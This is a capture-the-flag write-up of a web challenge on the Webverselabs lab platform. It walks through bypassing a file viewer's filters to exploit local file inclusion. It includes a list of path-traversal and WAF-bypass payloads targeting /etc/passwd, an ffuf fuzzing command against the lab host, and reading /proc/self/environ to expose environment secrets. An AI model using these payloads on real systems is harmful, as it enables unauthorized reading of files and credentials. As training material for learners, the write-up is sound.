---
title: "Webverselabs Toxin Challenge LFI  "
date: 2026-06-11 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Hard , Challenge , Web_Attacks ]
---


## Scenario : 

After a previous incident, Toxin Labs hardened their internal file viewer with input filters and request inspection. They're confident it's locked down. Prove them wrong.

## Solution : 

<img width="1733" height="903" alt="image" src="https://github.com/user-attachments/assets/7d486f8d-e170-4c0d-9923-2a043bc0cb15" />

If we visit the Application , we see that it is a monitoring app , where we can monitor Resources like CPU , RAM , etc. As usual we will browse the application like a normal user , then look at burp's History to see if we see any requests that we can tamper with . 

First let's check the different endpoints with got : 

**/Files :**

<img width="1731" height="718" alt="image" src="https://github.com/user-attachments/assets/ab0abc6c-2cb2-4ebe-96d0-b1c8fa025b7e" />

This is a list of filees that we are able to read . 

**/Services :**

<img width="1617" height="823" alt="image" src="https://github.com/user-attachments/assets/fe2e3cb6-e7af-45f8-be2a-1551bc5e5d37" />

A list of services running , we can't really get any additional information if we try clicking on any of them . 

**/Logs :**

<img width="1476" height="750" alt="image" src="https://github.com/user-attachments/assets/a2b64e91-7646-4010-97af-049da428a4a5" />

Just a log file :)

**/Release Note:**

<img width="1401" height="702" alt="image" src="https://github.com/user-attachments/assets/fb12a47b-2981-4cb9-a0a6-4c907853f160" />

Finally there is the Release endpoint which just lists information about different Releases. 

The only endpoint that we can get more out of was the /Files endpoint where we got to read the actual files. I m always looking for parameters, or POST Requests as these are most of the times our way in. 

<img width="1505" height="619" alt="image" src="https://github.com/user-attachments/assets/0f2fa033-fa78-445c-be2b-60579f8770ed" />

If we try to read any of the file , we find this new parameter , "?file=", perfect as this can lead to an LFI. Looking at the response we see that the file is located at /var/www/files/..., now we can try to escape this and go back to the root directory and read a file from there:

<img width="1384" height="489" alt="image" src="https://github.com/user-attachments/assets/5c524b12-08c3-4849-ac8b-3a125571e895" />

Aaaaand we're blocked , i wasn't expecting it to work really since this is supposed to be a Hard Challenge, now first thing i thought of was to try and bypass the WAF , i tried all WAF Bypass techniques out there :) 

Here is a list of some of the tests : 

```bash
# Double encoding
..%252f..%252f..%252fetc%252fpasswd
..%255c..%255c..%255cwindows%255cwin.ini

# UTF-8 encoding
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00

# URL encoding
..%2f..%2f..%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini

# Double dot bypass
....//....//....//etc/passwd
....\/....\/....\/etc/passwd

# Null Byte + URL Encoding :
../../../etc/passwd%00
%252e%252e%252fetc%252fpasswd%00

# Filter Bypass :
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
..///////..////..//////etc/passwd
....//....//etc/passwd
..///////..////..//////etc/passwd
/var/www/../../etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd

```
None of these worked unfortunately : 

Then i moved to FFUF , using a wordlist from Seclist like the Jhaddix wordlist for LFI : 

```bash
ffuf -u https://4ab954f6-4327-toxin-17c75.challenges.webverselabs-pro.com/view?file=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt  -fs 8934,8658
```

<img width="1545" height="843" alt="image" src="https://github.com/user-attachments/assets/6379dd3a-7b30-4bc8-95ed-79a479013272" />

Filtering by Size definetly didn't help -_- , i tried Lines but that didn't help either , 326,324,..... too many 300 something lines. 

So i decided to put it all in a Json Format and filter it based on having +400 lines , this feature isn't available with ffuf . 

```bash
ffuf -u "https://4ab954f6-4327-toxin-17c75.challenges.webverselabs-pro.com/view?file=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs 8934,8658 -o results.json -of json
```

<img width="1888" height="753" alt="image" src="https://github.com/user-attachments/assets/7c007782-c851-4757-a26a-7304e16becfb" />

Now why are we filtering based on Lines ? we already saw that when we get blocked by a WAF , we always get pretty much the same amount of lines (around 320 or a bit higher).

We can try to filter for responses where the number of line is higher , maybe these didn't return the generic WAF block .

```bash
cat results.json | jq '.results[] | select(.lines > 400)'
```
<img width="1330" height="956" alt="image" src="https://github.com/user-attachments/assets/49f8a40a-b6b0-4c73-a449-ae66c5b48174" />

Let's try and visit these endpoints : 

<img width="1671" height="623" alt="image" src="https://github.com/user-attachments/assets/f1c3ecc9-8a80-46cc-b987-f3092ff500f8" />

This works perfectly , i think the reason why proc works is that the app The app is used to monitor hardware resources that are found in /proc so it needs to read /proc/ to display those system stats

Another very important file that we can read inside the /proc is the /proc/self/environ which has some senstive information like the Env variables, PATH, (The flag as well ) :) .

<img width="1523" height="621" alt="image" src="https://github.com/user-attachments/assets/bd8a1abc-0b5f-4d19-9a4a-c2ec7cce8269" />

This time the flag was in /proc/self/env since /proc was the only way in . 

That was all for this challenge, see you in the next one :) 

